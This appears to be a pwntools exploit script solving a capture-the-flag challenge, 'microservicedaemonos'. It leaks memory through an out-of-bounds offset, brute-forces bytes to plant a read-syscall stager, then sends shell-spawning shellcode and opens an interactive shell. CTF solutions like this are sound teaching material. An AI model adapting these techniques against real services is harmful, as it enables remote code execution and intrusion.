from pwn import *

HOST, PORT = "microservicedaemonos.ctfcompetition.com", "1337"
# HOST, PORT = "0.0.0.0", 31338
r = remote(HOST, PORT)

menu = lambda: r.recvuntil(": ")
ii = lambda x: r.sendline(str(x))
go = lambda x: (menu(), ii(x))[0]

def add(type):
	ii('l')
	ii(type)

def cmd(index, type):
	ii('c')
	ii(index)
	ii(type)

add(1)
add(0)
add(1)
def rc4(index, offset, data):
	cmd(index, 's')
	ii(len(data))
	ii(offset)
	r.send(data)
	r.recvuntil('data offset: ')
	data=r.recvn(len(data))
	print hexdump(data)
	return data

def metasum(index, offset, count):
	cmd(index, 'g')
	ii(offset)
	ii(count)
	r.recvuntil('count: ')
	data=r.recvn(count * 4)
	print hexdump(data)
	return data

context.arch='amd64'

shcode=asm("""
	push rax
	pop rsi
	xor edi, edi
	xor eax, eax
	syscall
	""")

rc4(2,-0x8000000, 'a')
data=metasum(1, 0, 0x7fd8)
map={}
for i in range(0, len(data), 4):
	key=data[i:i+4]
	if key not in map:
		map[key] = []
	map[key].append(i/4)

for k in map.keys():
	if len(map[k]) == 1:
		delta = map[k][0] * 0x1000

pause()
rc4(2,0,'a')
for i, c in enumerate(shcode):
	while rc4(2,-0x8000+0x4000-delta+i,'a') != c:
		pass
	print i

pause()
cmd(2, 'g')
r.send('a'*len(shcode)+asm(shellcraft.sh()))
r.interactive()
